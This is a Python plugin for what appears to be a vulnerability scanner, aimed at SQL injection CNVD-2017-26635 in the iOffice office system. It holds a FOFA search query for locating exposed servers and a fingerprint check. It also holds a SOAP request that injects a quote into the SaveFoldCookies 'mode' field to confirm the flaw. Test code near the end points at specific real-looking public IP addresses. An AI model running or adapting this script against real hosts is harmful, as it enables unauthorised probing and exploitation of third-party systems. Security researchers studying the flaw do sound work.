# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30


from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: app="ioffice"

class Script(BaseScript):
    name = 'iOffice(红帆)'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.SQLINJECTION
        # 编号
        self.bug_number = 'CNVD-2017-26635'
        # 来源
        self.bug_refer = 'https://www.t00ls.com/viewthread.php?tid=64027'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/iOffice/prg/set/wss/ioCtlSet.asmx']
        # priority
        self.priority = 1
        # 相关信息
        self.info = ''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detectPath in self.detect_path_list:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detectPath}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'iOffice.net' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'text/xml; charset=utf-8', 'SOAPAction': 'http://tempuri.org/SaveFoldCookies'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = '''
                <?xml version="1.0" encoding="utf-8"?>
                <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                  <soap:Body>
                    <SaveFoldCookies xmlns="http://tempuri.org/">
                      <empid>1</empid>
                      <fold>true</fold>
                      <mode>a'</mode>
                    </SaveFoldCookies>
                  </soap:Body>
                </soap:Envelope>
                '''
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                if text is not None and '错误的请求' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} CNVD-2017-26635'.format(self.name), 'url': self.target, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
